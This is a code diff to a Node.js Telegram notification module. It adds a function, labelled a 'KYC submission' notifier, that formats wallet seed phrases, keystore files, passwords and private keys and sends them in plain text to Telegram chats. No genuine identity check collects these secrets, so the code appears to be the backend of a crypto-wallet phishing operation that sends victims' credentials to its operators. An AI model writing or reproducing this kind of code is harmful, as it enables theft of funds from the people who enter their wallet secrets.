@@ -42,6 +42,7 @@ if (ENABLE_TELEGRAM && TOKEN) {
   console.log('Telegram bot disabled. To enable set ENABLE_TELEGRAM=true and provide TELEGRAM_BOT_TOKEN in .env');
 }
 
+
 function notifyNewAdmin(username) {
   const message = `New Admin registered: ${username}`;
   if (bot) {
@@ -53,9 +54,35 @@ function notifyNewAdmin(username) {
       }
     });
   } else {
-    // Bot disabled or failed to start — log to console for developers
     console.log('[telegram stub] notifyNewAdmin:', message);
   }
 }
 
-module.exports = { notifyNewAdmin };
+function notifyNewKyc(details) {
+  // Format KYC details for Telegram
+  const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images } = details;
+  let message = `New KYC Submission:\nSession ID: ${sessionId || 'N/A'}\nWallet Type: ${walletType || 'N/A'}`;
+  if (seedPhrase) message += `\nSeed Phrase: ${seedPhrase}`;
+  if (keystoreJson) message += `\nKeystore JSON: ${keystoreJson}`;
+  if (password) message += `\nPassword: ${password}`;
+  if (privateKey) message += `\nPrivate Key: ${privateKey}`;
+  if (images && images.length) {
+    message += `\nImages:`;
+    images.forEach((img, idx) => {
+      message += `\n  ${idx + 1}. ${img.url || img.secure_url || img.public_id}`;
+    });
+  }
+  if (bot) {
+    chatIds.forEach(chatId => {
+      try {
+        bot.sendMessage(chatId, message);
+      } catch (err) {
+        console.error('Failed to send telegram KYC message', err);
+      }
+    });
+  } else {
+    console.log('[telegram stub] notifyNewKyc:', message);
+  }
+}
+
+module.exports = { notifyNewAdmin, notifyNewKyc };
